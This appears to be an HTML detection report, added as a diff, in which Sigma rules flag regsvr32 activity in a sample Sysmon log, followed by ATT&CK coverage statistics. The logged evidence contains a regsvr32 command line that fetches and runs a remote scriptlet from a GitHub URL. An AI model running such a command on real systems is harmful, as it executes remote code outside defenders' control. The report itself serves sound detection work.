@@ -1,0 +1,1270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bastion report: sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx</title>
+<style>
+  :root {
+    --bg: #0d1117; --panel: #161b22; --border: #30363d;
+    --text: #c9d1d9; --muted: #8b949e;
+    --critical: #ff5555; --high: #f85149; --medium: #d29922;
+    --low: #58a6ff; --informational: #8b949e;
+    --green: #3fb950; --red: #f85149;
+  }
+  * { box-sizing: border-box; }
+  body { background: var(--bg); color: var(--text); margin: 0;
+         font: 15px/1.5 "Segoe UI", system-ui, sans-serif; }
+  .wrap { max-width: 1100px; margin: 0 auto; padding: 24px; }
+  h1 { font-size: 22px; margin: 0 0 4px; }
+  h2 { font-size: 18px; margin: 32px 0 12px; border-bottom: 1px solid var(--border);
+       padding-bottom: 6px; }
+  h3 { font-size: 15px; margin: 18px 0 8px; color: var(--muted);
+       text-transform: uppercase; letter-spacing: .05em; }
+  .sub { color: var(--muted); margin-bottom: 20px; }
+  .stats { display: flex; flex-wrap: wrap; gap: 12px; margin: 16px 0; }
+  .stat { background: var(--panel); border: 1px solid var(--border); border-radius: 8px;
+          padding: 12px 18px; min-width: 130px; }
+  .stat .num { font-size: 24px; font-weight: 700; }
+  .stat .lbl { color: var(--muted); font-size: 12px; }
+  .stat.warn .num { color: var(--red); }
+  .banner { background: #2d1d10; border: 1px solid #6b4a1b; border-radius: 8px;
+            padding: 10px 14px; margin: 14px 0; color: #e3b341; font-size: 14px; }
+  .card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px;
+          padding: 14px 16px; margin: 10px 0; }
+  .card .head { display: flex; gap: 10px; align-items: baseline; flex-wrap: wrap; }
+  .card .title { font-weight: 600; }
+  .badge { font-size: 11px; font-weight: 700; text-transform: uppercase;
+           border-radius: 10px; padding: 2px 9px; color: #0d1117; }
+  .badge.critical { background: var(--critical); }
+  .badge.high { background: var(--high); }
+  .badge.medium { background: var(--medium); }
+  .badge.low { background: var(--low); }
+  .badge.informational { background: var(--informational); }
+  .tech { color: var(--low); font-size: 13px; }
+  .meta { color: var(--muted); font-size: 12px; margin-top: 4px; }
+  table.evidence { border-collapse: collapse; margin-top: 8px; font-size: 13px; width: 100%; }
+  table.evidence td { border: 1px solid var(--border); padding: 4px 8px;
+                      font-family: Consolas, monospace; word-break: break-all; }
+  table.evidence td.k { color: var(--muted); width: 160px; }
+  pre.raw { background: #0b0e13; border: 1px solid var(--border); border-radius: 6px;
+            padding: 8px 10px; font: 12px/1.4 Consolas, monospace; overflow-x: auto;
+            white-space: pre-wrap; word-break: break-all; color: var(--muted); margin: 8px 0 0; }
+  .bar { background: #21262d; border-radius: 6px; height: 14px; overflow: hidden; }
+  .bar .fill { background: var(--green); height: 100%; }
+  .tactic-row { display: grid; grid-template-columns: 220px 1fr 110px; gap: 12px;
+                align-items: center; margin: 6px 0; }
+  .tactic-row .nums { color: var(--muted); font-size: 13px; text-align: right; }
+  details { margin: 8px 0; }
+  summary { cursor: pointer; color: var(--muted); }
+  .chips { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
+  .chip { font: 12px Consolas, monospace; border-radius: 4px; padding: 2px 7px;
+          border: 1px solid var(--border); }
+  .chip.ok { color: var(--green); border-color: #238636; }
+  .chip.miss { color: var(--red); border-color: #6e2c28; }
+  .footer { color: var(--muted); font-size: 12px; margin-top: 36px;
+            border-top: 1px solid var(--border); padding-top: 10px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Bastion detection report</h1>
+  <div class="sub">
+    Log file <strong>sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx</strong> (windows) ·
+    Sigma r2026-04-01 ·
+    ATT&amp;CK v19.1  </div>
+
+  <div class="stats">
+    <div class="stat"><div class="num">6</div><div class="lbl">events scanned</div></div>
+    <div class="stat"><div class="num">2456</div><div class="lbl">rules loaded</div></div>
+    <div class="stat"><div class="num">2</div><div class="lbl">detections</div></div>
+    <div class="stat"><div class="num">2</div><div class="lbl">techniques observed</div></div>
+    <div class="stat"><div class="num">306/697</div><div class="lbl">techniques covered by ruleset</div></div>
+    <div class="stat warn"><div class="num">391</div><div class="lbl">techniques with no detection rule</div></div>
+  </div>
+
+  <div class="banner">
+    Caveats: 94 rules use unsupported Sigma grammar and were not
+    evaluated; 0 rules errored and were skipped. Neither group counts
+    toward coverage.
+  </div>
+
+  <h2>Detections by ATT&amp;CK tactic</h2>
+  <h3>stealth (2)</h3>
+  <div class="card">
+    <div class="head">
+      <span class="badge medium">medium</span>
+      <span class="title">Potentially Suspicious Regsvr32 HTTP/FTP Pattern</span>
+      <span class="tech">
+T1218.010 Regsvr32      </span>
+    </div>
+    <div class="meta">
+      sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx
+ · 2019-05-13T18:03:19.681479+00:00      · rule 867356ee-9352-41c9-a8f2-1be690d78216
+    </div>
+    <table class="evidence">
+      <tr><td class="k">Image</td><td>C:\Windows\System32\regsvr32.exe</td></tr>
+      <tr><td class="k">CommandLine</td><td>/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</td></tr>
+    </table>
+    <pre class="raw">&lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;&lt;System&gt;&lt;Provider Name=&#34;Microsoft-Windows-Sysmon&#34; Guid=&#34;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&#34;&gt;&lt;/Provider&gt;
+&lt;EventID Qualifiers=&#34;&#34;&gt;1&lt;/EventID&gt;
+&lt;Version&gt;5&lt;/Version&gt;
+&lt;Level&gt;4&lt;/Level&gt;
+&lt;Task&gt;1&lt;/Task&gt;
+&lt;Opcode&gt;0&lt;/Opcode&gt;
+&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;
+&lt;TimeCreated SystemTime=&#34;2019-05-13 18:03:19.681479+00:00&#34;&gt;&lt;/TimeCreated&gt;
+&lt;EventRecordID&gt;17287&lt;/EventRecordID&gt;
+&lt;Correlation ActivityID=&#34;&#34; RelatedActivityID=&#34;&#34;&gt;&lt;/Correlation&gt;
+&lt;Execution ProcessID=&#34;276&#34; ThreadID=&#34;1000&#34;&gt;&lt;/Execution&gt;
+&lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;
+&lt;Computer&gt;IEWIN7&lt;/Computer&gt;
+&lt;Security UserID=&#34;S-1-5-18&#34;&gt;&lt;/Security&gt;
+&lt;/System&gt;
+&lt;EventData&gt;&lt;Data Name=&#34;RuleName&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;UtcTime&#34;&gt;2019-05-13 18:03:19.497&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessGuid&#34;&gt;{365abb72-b167-5cd9-0000-001062160c00}&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessId&#34;&gt;2476&lt;/Data&gt;
+&lt;Data Name=&#34;Image&#34;&gt;C:\Windows\System32\regsvr32.exe&lt;/Data&gt;
+&lt;Data Name=&#34;FileVersion&#34;&gt;6.1.7600.16385 (win7_rtm.090713-1255)&lt;/Data&gt;
+&lt;Data Name=&#34;Description&#34;&gt;Microsoft(C) Register Server&lt;/Data&gt;
+&lt;Data Name=&#34;Product&#34;&gt;Microsoft&amp;#174; Windows&amp;#174; Operating System&lt;/Data&gt;
+&lt;Data Name=&#34;Company&#34;&gt;Microsoft Corporation&lt;/Data&gt;
+&lt;Data Name=&#34;CommandLine&#34;&gt;/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&lt;/Data&gt;
+&lt;Data Name=&#34;CurrentDirectory&#34;&gt;C:\Windows\system32\&lt;/Data&gt;
+&lt;Data Name=&#34;User&#34;&gt;IEWIN7\IEUser&lt;/Data&gt;
+&lt;Data Name=&#34;LogonGuid&#34;&gt;{365abb72-b0ec-5cd9-0000-00201d340100}&lt;/Data&gt;
+&lt;Data Name=&#34;LogonId&#34;&gt;0x000000000001341d&lt;/Data&gt;
+&lt;Data Name=&#34;TerminalSessionId&#34;&gt;1&lt;/Data&gt;
+&lt;Data Name=&#34;IntegrityLevel&#34;&gt;Medium&lt;/Data&gt;
+&lt;Data Name=&#34;Hashes&#34;&gt;SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583&lt;/Data&gt;
+&lt;Data Name=&#34;ParentProcessGuid&#34;&gt;{365abb72-b0ec-5cd9-0000-0010d9d20000}&lt;/Data&gt;
+&lt;Data Name=&#34;ParentProcessId&#34;&gt;944&lt;/Data&gt;
+&lt;Data Name=&#34;ParentImage&#34;&gt;C:\Windows\System32\svchost.exe&lt;/Data&gt;
+&lt;Data Name=&#34;ParentCommandLine&#34;&gt;C:\Windows\system32\svchost.exe -k netsvcs&lt;/Data&gt;
+&lt;/EventData&gt;
+&lt;/Event&gt;
+</pre>
+  </div>
+  <div class="card">
+    <div class="head">
+      <span class="badge medium">medium</span>
+      <span class="title">Network Connection Initiated By Regsvr32.EXE</span>
+      <span class="tech">
+T1559.001 Component Object Model · T1218.010 Regsvr32      </span>
+    </div>
+    <div class="meta">
+      sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx
+ · 2019-05-13T18:03:21.212896+00:00      · rule c7e91a02-d771-4a6d-a700-42587e0b1095
+    </div>
+    <table class="evidence">
+      <tr><td class="k">Initiated</td><td>True</td></tr>
+      <tr><td class="k">Image</td><td>C:\Windows\System32\regsvr32.exe</td></tr>
+    </table>
+    <pre class="raw">&lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;&lt;System&gt;&lt;Provider Name=&#34;Microsoft-Windows-Sysmon&#34; Guid=&#34;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&#34;&gt;&lt;/Provider&gt;
+&lt;EventID Qualifiers=&#34;&#34;&gt;3&lt;/EventID&gt;
+&lt;Version&gt;5&lt;/Version&gt;
+&lt;Level&gt;4&lt;/Level&gt;
+&lt;Task&gt;3&lt;/Task&gt;
+&lt;Opcode&gt;0&lt;/Opcode&gt;
+&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;
+&lt;TimeCreated SystemTime=&#34;2019-05-13 18:03:21.212896+00:00&#34;&gt;&lt;/TimeCreated&gt;
+&lt;EventRecordID&gt;17289&lt;/EventRecordID&gt;
+&lt;Correlation ActivityID=&#34;&#34; RelatedActivityID=&#34;&#34;&gt;&lt;/Correlation&gt;
+&lt;Execution ProcessID=&#34;276&#34; ThreadID=&#34;2056&#34;&gt;&lt;/Execution&gt;
+&lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;
+&lt;Computer&gt;IEWIN7&lt;/Computer&gt;
+&lt;Security UserID=&#34;S-1-5-18&#34;&gt;&lt;/Security&gt;
+&lt;/System&gt;
+&lt;EventData&gt;&lt;Data Name=&#34;RuleName&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;UtcTime&#34;&gt;2019-05-13 18:03:20.485&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessGuid&#34;&gt;{365abb72-b167-5cd9-0000-001062160c00}&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessId&#34;&gt;2476&lt;/Data&gt;
+&lt;Data Name=&#34;Image&#34;&gt;C:\Windows\System32\regsvr32.exe&lt;/Data&gt;
+&lt;Data Name=&#34;User&#34;&gt;IEWIN7\IEUser&lt;/Data&gt;
+&lt;Data Name=&#34;Protocol&#34;&gt;tcp&lt;/Data&gt;
+&lt;Data Name=&#34;Initiated&#34;&gt;True&lt;/Data&gt;
+&lt;Data Name=&#34;SourceIsIpv6&#34;&gt;False&lt;/Data&gt;
+&lt;Data Name=&#34;SourceIp&#34;&gt;10.0.2.15&lt;/Data&gt;
+&lt;Data Name=&#34;SourceHostname&#34;&gt;IEWIN7&lt;/Data&gt;
+&lt;Data Name=&#34;SourcePort&#34;&gt;49159&lt;/Data&gt;
+&lt;Data Name=&#34;SourcePortName&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationIsIpv6&#34;&gt;False&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationIp&#34;&gt;151.101.128.133&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationHostname&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationPort&#34;&gt;443&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationPortName&#34;&gt;https&lt;/Data&gt;
+&lt;/EventData&gt;
+&lt;/Event&gt;
+</pre>
+  </div>
+  <h3>execution (1)</h3>
+  <div class="card">
+    <div class="head">
+      <span class="badge medium">medium</span>
+      <span class="title">Network Connection Initiated By Regsvr32.EXE</span>
+      <span class="tech">
+T1559.001 Component Object Model · T1218.010 Regsvr32      </span>
+    </div>
+    <div class="meta">
+      sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx
+ · 2019-05-13T18:03:21.212896+00:00      · rule c7e91a02-d771-4a6d-a700-42587e0b1095
+    </div>
+    <table class="evidence">
+      <tr><td class="k">Initiated</td><td>True</td></tr>
+      <tr><td class="k">Image</td><td>C:\Windows\System32\regsvr32.exe</td></tr>
+    </table>
+    <pre class="raw">&lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;&lt;System&gt;&lt;Provider Name=&#34;Microsoft-Windows-Sysmon&#34; Guid=&#34;{5770385f-c22a-43e0-bf4c-06f5698ffbd9}&#34;&gt;&lt;/Provider&gt;
+&lt;EventID Qualifiers=&#34;&#34;&gt;3&lt;/EventID&gt;
+&lt;Version&gt;5&lt;/Version&gt;
+&lt;Level&gt;4&lt;/Level&gt;
+&lt;Task&gt;3&lt;/Task&gt;
+&lt;Opcode&gt;0&lt;/Opcode&gt;
+&lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;
+&lt;TimeCreated SystemTime=&#34;2019-05-13 18:03:21.212896+00:00&#34;&gt;&lt;/TimeCreated&gt;
+&lt;EventRecordID&gt;17289&lt;/EventRecordID&gt;
+&lt;Correlation ActivityID=&#34;&#34; RelatedActivityID=&#34;&#34;&gt;&lt;/Correlation&gt;
+&lt;Execution ProcessID=&#34;276&#34; ThreadID=&#34;2056&#34;&gt;&lt;/Execution&gt;
+&lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;
+&lt;Computer&gt;IEWIN7&lt;/Computer&gt;
+&lt;Security UserID=&#34;S-1-5-18&#34;&gt;&lt;/Security&gt;
+&lt;/System&gt;
+&lt;EventData&gt;&lt;Data Name=&#34;RuleName&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;UtcTime&#34;&gt;2019-05-13 18:03:20.485&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessGuid&#34;&gt;{365abb72-b167-5cd9-0000-001062160c00}&lt;/Data&gt;
+&lt;Data Name=&#34;ProcessId&#34;&gt;2476&lt;/Data&gt;
+&lt;Data Name=&#34;Image&#34;&gt;C:\Windows\System32\regsvr32.exe&lt;/Data&gt;
+&lt;Data Name=&#34;User&#34;&gt;IEWIN7\IEUser&lt;/Data&gt;
+&lt;Data Name=&#34;Protocol&#34;&gt;tcp&lt;/Data&gt;
+&lt;Data Name=&#34;Initiated&#34;&gt;True&lt;/Data&gt;
+&lt;Data Name=&#34;SourceIsIpv6&#34;&gt;False&lt;/Data&gt;
+&lt;Data Name=&#34;SourceIp&#34;&gt;10.0.2.15&lt;/Data&gt;
+&lt;Data Name=&#34;SourceHostname&#34;&gt;IEWIN7&lt;/Data&gt;
+&lt;Data Name=&#34;SourcePort&#34;&gt;49159&lt;/Data&gt;
+&lt;Data Name=&#34;SourcePortName&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationIsIpv6&#34;&gt;False&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationIp&#34;&gt;151.101.128.133&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationHostname&#34;&gt;&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationPort&#34;&gt;443&lt;/Data&gt;
+&lt;Data Name=&#34;DestinationPortName&#34;&gt;https&lt;/Data&gt;
+&lt;/EventData&gt;
+&lt;/Event&gt;
+</pre>
+  </div>
+
+  <h2>ATT&amp;CK coverage of the loaded ruleset</h2>
+  <p>
+    The ruleset references <strong>306 of 697</strong>
+    enterprise techniques. <strong style="color: var(--red)">391 techniques have
+    no detection rule at all.</strong> A green chip below means at least one rule is tagged to the
+    technique, which is not the same as saying the activity would be detected.
+  </p>
+  <div class="tactic-row">
+    <div>collection</div>
+    <div class="bar"><div class="fill" style="width: 46.0%"></div></div>
+    <div class="nums">19 / 41</div>
+  </div>
+  <div class="tactic-row">
+    <div>command-and-control</div>
+    <div class="bar"><div class="fill" style="width: 51.0%"></div></div>
+    <div class="nums">23 / 45</div>
+  </div>
+  <div class="tactic-row">
+    <div>credential-access</div>
+    <div class="bar"><div class="fill" style="width: 52.0%"></div></div>
+    <div class="nums">35 / 67</div>
+  </div>
+  <div class="tactic-row">
+    <div>defense-impairment</div>
+    <div class="bar"><div class="fill" style="width: 23.0%"></div></div>
+    <div class="nums">13 / 56</div>
+  </div>
+  <div class="tactic-row">
+    <div>discovery</div>
+    <div class="bar"><div class="fill" style="width: 63.0%"></div></div>
+    <div class="nums">31 / 49</div>
+  </div>
+  <div class="tactic-row">
+    <div>execution</div>
+    <div class="bar"><div class="fill" style="width: 50.0%"></div></div>
+    <div class="nums">32 / 64</div>
+  </div>
+  <div class="tactic-row">
+    <div>exfiltration</div>
+    <div class="bar"><div class="fill" style="width: 42.0%"></div></div>
+    <div class="nums">8 / 19</div>
+  </div>
+  <div class="tactic-row">
+    <div>impact</div>
+    <div class="bar"><div class="fill" style="width: 36.0%"></div></div>
+    <div class="nums">12 / 33</div>
+  </div>
+  <div class="tactic-row">
+    <div>initial-access</div>
+    <div class="bar"><div class="fill" style="width: 64.0%"></div></div>
+    <div class="nums">14 / 22</div>
+  </div>
+  <div class="tactic-row">
+    <div>lateral-movement</div>
+    <div class="bar"><div class="fill" style="width: 65.0%"></div></div>
+    <div class="nums">15 / 23</div>
+  </div>
+  <div class="tactic-row">
+    <div>persistence</div>
+    <div class="bar"><div class="fill" style="width: 48.0%"></div></div>
+    <div class="nums">54 / 113</div>
+  </div>
+  <div class="tactic-row">
+    <div>privilege-escalation</div>
+    <div class="bar"><div class="fill" style="width: 51.0%"></div></div>
+    <div class="nums">49 / 96</div>
+  </div>
+  <div class="tactic-row">
+    <div>reconnaissance</div>
+    <div class="bar"><div class="fill" style="width: 15.0%"></div></div>
+    <div class="nums">7 / 46</div>
+  </div>
+  <div class="tactic-row">
+    <div>resource-development</div>
+    <div class="bar"><div class="fill" style="width: 12.0%"></div></div>
+    <div class="nums">6 / 50</div>
+  </div>
+  <div class="tactic-row">
+    <div>stealth</div>
+    <div class="bar"><div class="fill" style="width: 51.0%"></div></div>
+    <div class="nums">75 / 148</div>
+  </div>
+
+  <details>
+    <summary>Per-technique detail (green = at least one rule, red = blind spot)</summary>
+    <h3>collection</h3>
+    <div class="chips">
+      <span class="chip ok" title="Data from Local System: 8 rule(s)">T1005</span>
+      <span class="chip ok" title="Data from Network Shared Drive: 2 rule(s)">T1039</span>
+      <span class="chip ok" title="Input Capture: 2 rule(s)">T1056</span>
+      <span class="chip ok" title="Keylogging: 2 rule(s)">T1056.001</span>
+      <span class="chip ok" title="GUI Input Capture: 2 rule(s)">T1056.002</span>
+      <span class="chip ok" title="Local Data Staging: 4 rule(s)">T1074.001</span>
+      <span class="chip ok" title="Screen Capture: 6 rule(s)">T1113</span>
+      <span class="chip ok" title="Email Collection: 2 rule(s)">T1114</span>
+      <span class="chip ok" title="Local Email Collection: 1 rule(s)">T1114.001</span>
+      <span class="chip ok" title="Clipboard Data: 3 rule(s)">T1115</span>
+      <span class="chip ok" title="Automated Collection: 4 rule(s)">T1119</span>
+      <span class="chip ok" title="Audio Capture: 4 rule(s)">T1123</span>
+      <span class="chip ok" title="Video Capture: 1 rule(s)">T1125</span>
+      <span class="chip ok" title="Browser Session Hijacking: 2 rule(s)">T1185</span>
+      <span class="chip ok" title="Adversary-in-the-Middle: 5 rule(s)">T1557</span>
+      <span class="chip ok" title="Name Resolution Poisoning and SMB Relay: 8 rule(s)">T1557.001</span>
+      <span class="chip ok" title="DHCP Spoofing: 1 rule(s)">T1557.003</span>
+      <span class="chip ok" title="Archive Collected Data: 2 rule(s)">T1560</span>
+      <span class="chip ok" title="Archive via Utility: 10 rule(s)">T1560.001</span>
+      <span class="chip miss" title="Data from Removable Media: no rules">T1025</span>
+      <span class="chip miss" title="Web Portal Capture: no rules">T1056.003</span>
+      <span class="chip miss" title="Credential API Hooking: no rules">T1056.004</span>
+      <span class="chip miss" title="Data Staged: no rules">T1074</span>
+      <span class="chip miss" title="Remote Data Staging: no rules">T1074.002</span>
+      <span class="chip miss" title="Remote Email Collection: no rules">T1114.002</span>
+      <span class="chip miss" title="Email Forwarding Rule: no rules">T1114.003</span>
+      <span class="chip miss" title="Data from Information Repositories: no rules">T1213</span>
+      <span class="chip miss" title="Confluence: no rules">T1213.001</span>
+      <span class="chip miss" title="Sharepoint: no rules">T1213.002</span>
+      <span class="chip miss" title="Code Repositories: no rules">T1213.003</span>
+      <span class="chip miss" title="Customer Relationship Management Software: no rules">T1213.004</span>
+      <span class="chip miss" title="Messaging Applications: no rules">T1213.005</span>
+      <span class="chip miss" title="Databases: no rules">T1213.006</span>
+      <span class="chip miss" title="Data from Cloud Storage: no rules">T1530</span>
+      <span class="chip miss" title="ARP Cache Poisoning: no rules">T1557.002</span>
+      <span class="chip miss" title="Evil Twin: no rules">T1557.004</span>
+      <span class="chip miss" title="Archive via Library: no rules">T1560.002</span>
+      <span class="chip miss" title="Archive via Custom Method: no rules">T1560.003</span>
+      <span class="chip miss" title="Data from Configuration Repository: no rules">T1602</span>
+      <span class="chip miss" title="SNMP (MIB Dump): no rules">T1602.001</span>
+      <span class="chip miss" title="Network Device Configuration Dump: no rules">T1602.002</span>
+    </div>
+    <h3>command-and-control</h3>
+    <div class="chips">
+      <span class="chip ok" title="Protocol or Service Impersonation: 2 rule(s)">T1001.003</span>
+      <span class="chip ok" title="Fallback Channels: 4 rule(s)">T1008</span>
+      <span class="chip ok" title="Application Layer Protocol: 4 rule(s)">T1071</span>
+      <span class="chip ok" title="Web Protocols: 29 rule(s)">T1071.001</span>
+      <span class="chip ok" title="DNS: 10 rule(s)">T1071.004</span>
+      <span class="chip ok" title="Proxy: 14 rule(s)">T1090</span>
+      <span class="chip ok" title="Internal Proxy: 6 rule(s)">T1090.001</span>
+      <span class="chip ok" title="External Proxy: 2 rule(s)">T1090.002</span>
+      <span class="chip ok" title="Multi-hop Proxy: 3 rule(s)">T1090.003</span>
+      <span class="chip ok" title="Non-Application Layer Protocol: 2 rule(s)">T1095</span>
+      <span class="chip ok" title="Web Service: 11 rule(s)">T1102</span>
+      <span class="chip ok" title="Dead Drop Resolver: 4 rule(s)">T1102.001</span>
+      <span class="chip ok" title="Bidirectional Communication: 3 rule(s)">T1102.002</span>
+      <span class="chip ok" title="One-Way Communication: 2 rule(s)">T1102.003</span>
+      <span class="chip ok" title="Ingress Tool Transfer: 60 rule(s)">T1105</span>
+      <span class="chip ok" title="Standard Encoding: 4 rule(s)">T1132.001</span>
+      <span class="chip ok" title="Remote Access Tools: 6 rule(s)">T1219</span>
+      <span class="chip ok" title="Remote Desktop Software: 38 rule(s)">T1219.002</span>
+      <span class="chip ok" title="Dynamic Resolution: 1 rule(s)">T1568</span>
+      <span class="chip ok" title="Domain Generation Algorithms: 1 rule(s)">T1568.002</span>
+      <span class="chip ok" title="Non-Standard Port: 3 rule(s)">T1571</span>
+      <span class="chip ok" title="Protocol Tunneling: 21 rule(s)">T1572</span>
+      <span class="chip ok" title="Encrypted Channel: 1 rule(s)">T1573</span>
+      <span class="chip miss" title="Data Obfuscation: no rules">T1001</span>
+      <span class="chip miss" title="Junk Data: no rules">T1001.001</span>
+      <span class="chip miss" title="Steganography: no rules">T1001.002</span>
+      <span class="chip miss" title="File Transfer Protocols: no rules">T1071.002</span>
+      <span class="chip miss" title="Mail Protocols: no rules">T1071.003</span>
+      <span class="chip miss" title="Publish/Subscribe Protocols: no rules">T1071.005</span>
+      <span class="chip miss" title="Domain Fronting: no rules">T1090.004</span>
+      <span class="chip miss" title="Communication Through Removable Media: no rules">T1092</span>
+      <span class="chip miss" title="Multi-Stage Channels: no rules">T1104</span>
+      <span class="chip miss" title="Data Encoding: no rules">T1132</span>
+      <span class="chip miss" title="Non-Standard Encoding: no rules">T1132.002</span>
+      <span class="chip miss" title="Traffic Signaling: no rules">T1205</span>
+      <span class="chip miss" title="Port Knocking: no rules">T1205.001</span>
+      <span class="chip miss" title="Socket Filters: no rules">T1205.002</span>
+      <span class="chip miss" title="IDE Tunneling: no rules">T1219.001</span>
+      <span class="chip miss" title="Remote Access Hardware: no rules">T1219.003</span>
+      <span class="chip miss" title="Fast Flux DNS: no rules">T1568.001</span>
+      <span class="chip miss" title="DNS Calculation: no rules">T1568.003</span>
+      <span class="chip miss" title="Symmetric Cryptography: no rules">T1573.001</span>
+      <span class="chip miss" title="Asymmetric Cryptography: no rules">T1573.002</span>
+      <span class="chip miss" title="Content Injection: no rules">T1659</span>
+      <span class="chip miss" title="Hide Infrastructure: no rules">T1665</span>
+    </div>
+    <h3>credential-access</h3>
+    <div class="chips">
+      <span class="chip ok" title="OS Credential Dumping: 26 rule(s)">T1003</span>
+      <span class="chip ok" title="LSASS Memory: 72 rule(s)">T1003.001</span>
+      <span class="chip ok" title="Security Account Manager: 26 rule(s)">T1003.002</span>
+      <span class="chip ok" title="NTDS: 21 rule(s)">T1003.003</span>
+      <span class="chip ok" title="LSA Secrets: 11 rule(s)">T1003.004</span>
+      <span class="chip ok" title="Cached Domain Credentials: 8 rule(s)">T1003.005</span>
+      <span class="chip ok" title="DCSync: 7 rule(s)">T1003.006</span>
+      <span class="chip ok" title="Network Sniffing: 6 rule(s)">T1040</span>
+      <span class="chip ok" title="Input Capture: 2 rule(s)">T1056</span>
+      <span class="chip ok" title="Keylogging: 2 rule(s)">T1056.001</span>
+      <span class="chip ok" title="GUI Input Capture: 2 rule(s)">T1056.002</span>
+      <span class="chip ok" title="Brute Force: 8 rule(s)">T1110</span>
+      <span class="chip ok" title="Password Guessing: 3 rule(s)">T1110.001</span>
+      <span class="chip ok" title="Password Cracking: 1 rule(s)">T1110.002</span>
+      <span class="chip ok" title="Forced Authentication: 4 rule(s)">T1187</span>
+      <span class="chip ok" title="Exploitation for Credential Access: 3 rule(s)">T1212</span>
+      <span class="chip ok" title="Steal Application Access Token: 6 rule(s)">T1528</span>
+      <span class="chip ok" title="Steal Web Session Cookie: 2 rule(s)">T1539</span>
+      <span class="chip ok" title="Unsecured Credentials: 2 rule(s)">T1552</span>
+      <span class="chip ok" title="Credentials In Files: 10 rule(s)">T1552.001</span>
+      <span class="chip ok" title="Credentials in Registry: 4 rule(s)">T1552.002</span>
+      <span class="chip ok" title="Private Keys: 5 rule(s)">T1552.004</span>
+      <span class="chip ok" title="Group Policy Preferences: 5 rule(s)">T1552.006</span>
+      <span class="chip ok" title="Credentials from Password Stores: 7 rule(s)">T1555</span>
+      <span class="chip ok" title="Credentials from Web Browsers: 7 rule(s)">T1555.003</span>
+      <span class="chip ok" title="Windows Credential Manager: 4 rule(s)">T1555.004</span>
+      <span class="chip ok" title="Password Managers: 1 rule(s)">T1555.005</span>
+      <span class="chip ok" title="Modify Authentication Process: 2 rule(s)">T1556</span>
+      <span class="chip ok" title="Password Filter DLL: 3 rule(s)">T1556.002</span>
+      <span class="chip ok" title="Adversary-in-the-Middle: 5 rule(s)">T1557</span>
+      <span class="chip ok" title="Name Resolution Poisoning and SMB Relay: 8 rule(s)">T1557.001</span>
+      <span class="chip ok" title="DHCP Spoofing: 1 rule(s)">T1557.003</span>
+      <span class="chip ok" title="Steal or Forge Kerberos Tickets: 5 rule(s)">T1558</span>
+      <span class="chip ok" title="Kerberoasting: 14 rule(s)">T1558.003</span>
+      <span class="chip ok" title="Steal or Forge Authentication Certificates: 4 rule(s)">T1649</span>
+      <span class="chip miss" title="Proc Filesystem: no rules">T1003.007</span>
+      <span class="chip miss" title="/etc/passwd and /etc/shadow: no rules">T1003.008</span>
+      <span class="chip miss" title="Web Portal Capture: no rules">T1056.003</span>
+      <span class="chip miss" title="Credential API Hooking: no rules">T1056.004</span>
+      <span class="chip miss" title="Password Spraying: no rules">T1110.003</span>
+      <span class="chip miss" title="Credential Stuffing: no rules">T1110.004</span>
+      <span class="chip miss" title="Multi-Factor Authentication Interception: no rules">T1111</span>
+      <span class="chip miss" title="Shell History: no rules">T1552.003</span>
+      <span class="chip miss" title="Cloud Instance Metadata API: no rules">T1552.005</span>
+      <span class="chip miss" title="Container API: no rules">T1552.007</span>
+      <span class="chip miss" title="Chat Messages: no rules">T1552.008</span>
+      <span class="chip miss" title="Keychain: no rules">T1555.001</span>
+      <span class="chip miss" title="Securityd Memory: no rules">T1555.002</span>
+      <span class="chip miss" title="Cloud Secrets Management Stores: no rules">T1555.006</span>
+      <span class="chip miss" title="Domain Controller Authentication: no rules">T1556.001</span>
+      <span class="chip miss" title="Pluggable Authentication Modules: no rules">T1556.003</span>
+      <span class="chip miss" title="Network Device Authentication: no rules">T1556.004</span>
